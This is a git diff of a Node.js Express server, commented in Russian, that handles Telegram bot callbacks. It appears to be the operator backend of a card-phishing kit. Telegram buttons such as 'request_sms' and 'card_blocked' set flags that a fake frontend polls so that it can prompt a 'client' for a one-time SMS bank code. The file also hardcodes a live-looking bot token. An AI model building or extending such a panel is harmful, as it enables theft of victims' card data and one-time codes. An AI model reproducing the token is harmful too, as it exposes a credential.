@@ -1,35 +1,10 @@
-/**
- * Telegram Bot Webhook Server
- * Простой webhook сервер для получения обновлений от Telegram
- */
-
 const express = require('express')
 const cors = require('cors')
 const https = require('https')
 const path = require('path')
-const fs = require('fs')
 
 const app = express()
 const PORT = process.env.PORT || 3001
-
-console.log('🚀 Starting Telegram Bot Webhook Server...')
-console.log('📁 Current directory:', __dirname)
-console.log('📁 Dist directory exists:', fs.existsSync(path.join(__dirname, 'dist')))
-console.log('🌐 Port:', PORT)
-console.log('🌐 Environment:', process.env.NODE_ENV || 'development')
-
-// Check if required files exist
-const requiredFiles = ['dist/index.html', 'package.json']
-requiredFiles.forEach(file => {
-  const filePath = path.join(__dirname, file)
-  console.log(`📄 ${file}:`, fs.existsSync(filePath) ? '✅' : '❌')
-})
-
-// Serve static files from dist directory (for frontend)
-app.use(express.static('dist'))
-
-// API routes
-app.use('/api', express.json())
 
 // Telegram Bot Configuration
 const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
@@ -42,35 +17,60 @@ const smsFlags = new Map()
 app.use(cors())
 app.use(express.json())
 
-// Health check endpoint (must be before catch-all route)
+// Health check endpoint
 app.get('/health', (req, res) => {
-  console.log('🏥 Health check requested')
-  try {
-    res.status(200).json({
-      status: 'ok',
-      timestamp: new Date().toISOString(),
-      smsFlags: smsFlags.size,
-      uptime: process.uptime(),
-      port: PORT,
-      environment: process.env.NODE_ENV || 'development'
-    })
-  } catch (error) {
-    console.error('❌ Health check error:', error)
-    res.status(500).json({ error: 'Health check failed' })
-  }
+  res.status(200).json({
+    status: 'ok',
+    timestamp: new Date().toISOString(),
+    smsFlags: smsFlags.size,
+    uptime: process.uptime(),
+    port: PORT,
+    environment: process.env.NODE_ENV || 'development'
+  })
 })
 
-// Serve frontend for all non-API routes
-app.use((req, res) => {
-  const indexPath = path.join(__dirname, 'dist', 'index.html')
-  console.log('📁 Serving frontend from:', indexPath)
+// API routes - must be before static file serving
+app.get('/api/check-sms/:userId', (req, res) => {
+  const { userId } = req.params
+  const smsRequested = smsFlags.get(userId) || false
+  res.json({ smsRequested })
+})
+
+app.post('/api/clear-sms/:userId', (req, res) => {
+  const { userId } = req.params
+  smsFlags.delete(userId)
+  res.status(200).json({ message: `SMS flag cleared for user ${userId}` })
+})
+
+app.post('/api/set-sms/:userId', (req, res) => {
+  const { userId } = req.params
+  smsFlags.set(userId, true)
+  res.status(200).json({ message: `SMS flag manually set for user ${userId}` })
+})
+
+// Telegram webhook endpoint
+app.post('/webhook', (req, res) => {
+  const update = req.body
   
-  // Check if dist directory exists
-  if (!require('fs').existsSync(path.join(__dirname, 'dist'))) {
-    console.error('❌ dist directory not found!')
-    return res.status(500).json({ error: 'Frontend not built' })
+  if (update.callback_query) {
+    handleCallbackQuery(update.callback_query)
+      .then(() => {
+        console.log('✅ Callback query processed')
+      })
+      .catch((error) => {
+        console.error('❌ Error processing callback query:', error.message)
+      })
   }
   
+  res.status(200).json({ ok: true })
+})
+
+// Serve static files from dist directory
+app.use(express.static('dist'))
+
+// Serve frontend for all other routes
+app.get('*', (req, res) => {
+  const indexPath = path.join(__dirname, 'dist', 'index.html')
   res.sendFile(indexPath)
 })
 
@@ -78,7 +78,6 @@ app.use((req, res) => {
  * Отправка сообщения в Telegram
  */
 function sendTelegramMessage(chatId, text) {
-  console.log(`📤 Sending message to chat ${chatId}: ${text}`)
   return new Promise((resolve, reject) => {
     const postData = JSON.stringify({
       chat_id: chatId,
@@ -99,13 +98,11 @@ function sendTelegramMessage(chatId, text) {
     const req = https.request(options, (res) => {
       res.on('data', () => {})
       res.on('end', () => {
-        console.log('✅ Message sent to Telegram')
         resolve()
       })
     })
 
     req.on('error', (error) => {
-      console.error('❌ Error sending message:', error.message)
       reject(error)
     })
 
@@ -118,7 +115,6 @@ function sendTelegramMessage(chatId, text) {
  * Ответ на callback query
  */
 function answerCallbackQuery(callbackQueryId, text) {
-  console.log(`📤 Answering callback query: ${callbackQueryId} with text: ${text}`)
   return new Promise((resolve, reject) => {
     const postData = JSON.stringify({
       callback_query_id: callbackQueryId,
@@ -144,20 +140,15 @@ function answerCallbackQuery(callbackQueryId, text) {
       })
       
       res.on('end', () => {
-        console.log(`📤 Telegram API response: ${res.statusCode} - ${data}`)
-        
         if (res.statusCode === 200) {
-          console.log('✅ Callback answered successfully')
           resolve()
         } else {
-          console.error(`❌ Telegram API error: ${res.statusCode} - ${data}`)
           reject(new Error(`Telegram API error: ${res.statusCode} - ${data}`))
         }
       })
     })
 
     req.on('error', (error) => {
-      console.error('❌ Network error answering callback:', error.message)
       reject(error)
     })
 
@@ -173,10 +164,6 @@ async function handleCallbackQuery(callbackQuery) {
   const callbackData = callbackQuery.data
   const chatId = callbackQuery.message.chat.id
   
-  console.log(`📱 Received callback: ${callbackData}`)
-  console.log(`👤 From user: ${callbackQuery.from.first_name} (${callbackQuery.from.id})`)
-  console.log(`💬 Chat ID: ${chatId}`)
-
   let userId = null
   let action = null
 
@@ -194,9 +181,6 @@ async function handleCallbackQuery(callbackQuery) {
     action = 'card_blocked'
   }
 
-  console.log(`🔍 Parsed userId: ${userId}`)
-  console.log(`🔍 Parsed action: ${action}`)
-
   if (userId && action) {
     let responseText = ''
 
@@ -204,9 +188,6 @@ async function handleCallbackQuery(callbackQuery) {
       case 'request_sms':
         smsFlags.set(userId, true)
         responseText = '📱 SMS запрошен. Клиент будет перенаправлен на SMS страницу.'
-        
-        console.log(`✅ SMS flag set for user: ${userId}`)
-        console.log(`📊 Total SMS flags: ${smsFlags.size}`)
         
         await sendTelegramMessage(chatId, `📱 <b>SMS КОД ЗАПРОШЕН</b>\n\n👤 ID клиента: <code>${userId}</code>\n⏰ Ожидаем ввода SMS кода...`)
         break
@@ -233,7 +214,6 @@ async function handleCallbackQuery(callbackQuery) {
       console.error('❌ Error answering callback query:', error.message)
     }
   } else {
-    console.log(`❌ No valid userId or action found for callback: ${callbackData}`)
     try {
       await answerCallbackQuery(callbackQuery.id, '❌ Ошибка обработки запроса')
     } catch (error) {
@@ -242,120 +222,10 @@ async function handleCallbackQuery(callbackQuery) {
   }
 }
 
-/**
- * WEBHOOK ENDPOINT - получение обновлений от Telegram
- */
-app.post('/webhook', (req, res) => {
-  console.log('📨 Webhook received from Telegram')
-  console.log('📋 Request body:', JSON.stringify(req.body, null, 2))
-  
-  const update = req.body
-  
-  if (update.callback_query) {
-    console.log('🔘 Processing callback query...')
-    handleCallbackQuery(update.callback_query)
-      .then(() => {
-        console.log('✅ Callback query processed')
-      })
-      .catch((error) => {
-        console.error('❌ Error processing callback query:', error.message)
-      })
-  } else {
-    console.log('📝 No callback query in update')
-  }
-  
-  res.status(200).json({ ok: true })
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`🚀 Server running on port ${PORT}`)
+  console.log(`📱 Telegram webhook: /webhook`)
+  console.log(`🔍 Health check: /health`)
+  console.log(`📊 SMS flags: ${smsFlags.size}`)
 })
-
-/**
- * API endpoint для проверки флага SMS
- * GET /api/check-sms/:userId
- */
-app.get('/api/check-sms/:userId', (req, res) => {
-  const { userId } = req.params
-  const smsRequested = smsFlags.get(userId) || false
-  
-  res.json({
-    smsRequested,
-    userId
-  })
-})
-
-/**
- * API endpoint для очистки флага SMS
- * POST /api/clear-sms/:userId
- */
-app.post('/api/clear-sms/:userId', (req, res) => {
-  const { userId } = req.params
-  smsFlags.delete(userId)
-  
-  res.json({
-    success: true,
-    userId
-  })
-})
-
-/**
- * API endpoint для ручной установки флага SMS
- * POST /api/set-sms/:userId
- */
-app.post('/api/set-sms/:userId', (req, res) => {
-  const { userId } = req.params
-  smsFlags.set(userId, true)
-  
-  console.log(`✅ Manual SMS flag set for user: ${userId}`)
-  console.log(`📊 Total SMS flags: ${smsFlags.size}`)
-  
-  res.json({
-    success: true,
-    userId,
-    smsRequested: true
-  })
-})
-
-
-// Root endpoint
-app.get('/', (req, res) => {
-  res.json({
-    name: 'Telegram Bot Webhook Server',
-    version: '1.0.0',
-    mode: 'WEBHOOK',
-    endpoints: {
-      webhook: 'POST /webhook',
-      checkSMS: 'GET /api/check-sms/:userId',
-      clearSMS: 'POST /api/clear-sms/:userId',
-      setSMS: 'POST /api/set-sms/:userId',
-      health: 'GET /health'
-    }
-  })
-})
-
-// Запуск сервера
-const server = app.listen(PORT, '0.0.0.0', () => {
-  console.log('')
-  console.log('═══════════════════════════════════════════════════')
-  console.log('  🚀 Telegram Bot Webhook Server')
-  console.log('═══════════════════════════════════════════════════')
-  console.log('')
-  console.log(`  📡 Server: http://0.0.0.0:${PORT}`)
-  console.log(`  🔄 Mode: WEBHOOK`)
-  console.log(`  ✅ Ready to receive Telegram updates`)
-  console.log('')
-  console.log('═══════════════════════════════════════════════════')
-  console.log('')
-})
-
-// Обработка ошибок
-server.on('error', (error) => {
-  console.error('❌ Server error:', error)
-})
-
-process.on('uncaughtException', (error) => {
-  console.error('❌ Uncaught Exception:', error)
-})
-
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason)
-})
-
-module.exports = app
